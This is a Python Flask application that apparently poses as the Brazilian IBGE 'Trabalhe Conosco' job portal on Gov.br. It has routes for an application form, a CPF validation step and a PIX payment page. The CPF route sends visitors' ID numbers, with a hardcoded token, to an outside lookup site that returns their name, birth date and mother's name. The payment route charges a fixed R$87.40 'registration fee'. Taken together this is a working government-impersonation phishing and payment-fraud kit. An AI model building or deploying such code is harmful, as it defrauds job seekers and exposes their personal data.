"""
Aplicação Flask simplificada para deploy no Heroku
IBGE Trabalhe Conosco - Portal Gov.br
"""
import os
from flask import Flask, render_template, request, jsonify, make_response
from nova_era_api import NovaEraAPI

# Criar app Flask básico
app = Flask(__name__)
app.secret_key = os.environ.get("SESSION_SECRET", "dev-secret-key-change-in-production")

# Configurações básicas
app.config['DEBUG'] = False
app.config['TESTING'] = False

# Cache simples
_cache = {}

@app.route('/')
def index():
    """Página inicial do IBGE Trabalhe Conosco"""
    response = make_response(render_template('index.html'))
    response.headers['Cache-Control'] = 'public, max-age=300'
    return response

@app.route('/resultados-busca')
def resultados_busca():
    """Página de resultados de busca de vagas"""
    return render_template('resultados_busca.html')

@app.route('/formulario-inscricao')
def formulario_inscricao():
    """Formulário de inscrição"""
    return render_template('formulario_inscricao.html')

@app.route('/comprovante-inscricao')
def comprovante_inscricao():
    """Comprovante de inscrição"""
    return render_template('comprovante_inscricao.html')

@app.route('/pagamento-pix')
def pagamento_pix():
    """Página de pagamento PIX"""
    return render_template('pagamento_pix.html')

@app.route('/agendamento-psicotecnico')
def agendamento_psicotecnico():
    """Agendamento psicotécnico"""
    return render_template('agendamento_psicotecnico.html')

@app.route('/registro-sgte')
def registro_sgte():
    """Registro SGTE"""
    return render_template('registro_sgte.html')

@app.route('/confirmacao-agendamento')
def confirmacao_agendamento():
    """Confirmação de agendamento"""
    return render_template('confirmacao_agendamento.html')

@app.route('/validar-cpf', methods=['POST'])
def validar_cpf():
    """Validar CPF usando API externa"""
    import requests
    
    try:
        data = request.get_json()
        cpf = data.get('cpf', '').replace('.', '').replace('-', '')
        
        if not cpf or len(cpf) != 11:
            return jsonify({'success': False, 'message': 'CPF inválido'})
        
        # API de validação de CPF
        api_url = f"https://consulta.fontesderenda.blog/cpf.php?token=1285fe4s-e931-4071-a848-3fac8273c55a&cpf={cpf}"
        
        response = requests.get(api_url, timeout=8)
        
        if response.status_code == 200:
            dados = response.json()
            
            if dados.get('situacao') == 'REGULAR':
                return jsonify({
                    'success': True,
                    'dados': {
                        'nome': dados.get('nome', ''),
                        'cpf': cpf,
                        'cpf_formatado': f"{cpf[:3]}.{cpf[3:6]}.{cpf[6:9]}-{cpf[9:]}",
                        'data_nascimento': dados.get('data_nascimento', ''),
                        'data_nascimento_formatada': dados.get('data_nascimento_formatada', ''),
                        'nome_mae': dados.get('nome_mae', ''),
                        'sexo': dados.get('sexo', ''),
                        'situacao': dados.get('situacao', '')
                    }
                })
            else:
                return jsonify({'success': False, 'message': 'CPF irregular ou bloqueado'})
        else:
            return jsonify({'success': False, 'message': 'Erro na validação do CPF'})
            
    except Exception as e:
        return jsonify({'success': False, 'message': f'Erro interno: {str(e)}'})

@app.route('/api/gerar-pix', methods=['POST'])
def gerar_pix():
    """Gerar pagamento PIX usando Nova Era API"""
    try:
        data = request.get_json()
        
        # Instanciar API Nova Era
        nova_era = NovaEraAPI()
        
        # Dados do pagamento
        valor = 87.40  # Taxa de inscrição IBGE
        descricao = "IBGE Trabalhe Conosco - Taxa de Inscrição"
        
        # Gerar PIX
        resultado = nova_era.criar_transacao_pix(valor, descricao)
        
        if resultado.get('success'):
            return jsonify({
                'success': True,
                'transacao_id': resultado.get('transacao_id'),
                'pix_code': resultado.get('pix_code'),
                'qr_code': resultado.get('qr_code'),
                'valor': f"R$ {valor:.2f}".replace('.', ','),
                'status': resultado.get('status'),
                'api_provider': 'Nova Era REAL'
            })
        else:
            return jsonify({
                'success': False,
                'message': resultado.get('message', 'Erro ao gerar PIX')
            })
            
    except Exception as e:
        return jsonify({
            'success': False,
            'message': f'Erro interno: {str(e)}'
        })

@app.route('/api/verificar-pagamento/<int:transacao_id>')
def verificar_pagamento(transacao_id):
    """Verificar status do pagamento PIX"""
    try:
        nova_era = NovaEraAPI()
        resultado = nova_era.verificar_pagamento(transacao_id)
        
        return jsonify(resultado)
        
    except Exception as e:
        return jsonify({
            'success': False,
            'message': f'Erro ao verificar pagamento: {str(e)}'
        })

@app.route('/suporte')
def suporte():
    """Página de suporte"""
    return render_template('index.html')

@app.errorhandler(404)
def not_found(error):
    """Página 404"""
    return render_template('index.html'), 404

@app.errorhandler(500)
def internal_error(error):
    """Página 500"""
    return render_template('index.html'), 500

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)